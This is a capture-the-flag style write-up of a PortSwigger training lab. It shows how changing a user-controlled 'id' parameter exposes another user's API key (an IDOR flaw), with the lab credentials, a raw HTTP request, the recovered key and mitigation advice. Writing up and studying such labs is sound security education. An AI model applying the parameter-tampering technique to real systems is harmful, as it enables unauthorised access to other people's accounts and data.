# User ID controlled by request parameter

**Source:** [PortSwigger](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter)  
**Category:** Access control  
**Difficulty:** APPRENTICE

## Objective
To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.

## Vulnerability
This lab has a horizontal privilege escalation vulnerability on the user account page.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

### Steps
1. Log in as `wiener:peter` and intercept the request. Nothing vulnerable is visible in the request.
2. Change the URL parameter to `?id=carlos`, which switches to the user `carlos`. His API key is displayed: `6O63eSuWB3PoN5vTItqoMGeIQDSu9OEI`
3. Submit the API key as the solution.

### Payload
```
GET /my-account?id=carlos HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=YOUR_SESSION_COOKIE
```

**Key modification:**  
Change `id=wiener` → `id=carlos`

### Shortcut
1. Login as `wiener:peter`
2. Navigate to `/my-account?id=wiener`
3. Change URL to `/my-account?id=carlos`
4. Copy API key: `6O63eSuWB3PoN5vTItqoMGeIQDSu9OEI`
5. Submit the key in the lab solution field

## Impact
- Access to sensitive data (API keys, personal information) of other users
- User enumeration and account takeover
- Data breach and privacy violations

## Mitigation
- Server-side authorization checks for every request
- Use session-based user identification instead of user-controlled parameters
- Implement indirect object references (UUIDs instead of predictable IDs)
- Input validation and proper access controls

## Tools
- Burp Suite
- Browser

## Notes
- Classic IDOR (Insecure Direct Object Reference) vulnerability
- Application trusts user-supplied `id` parameter without validating ownership
- Always verify authorization on the server side – never trust client input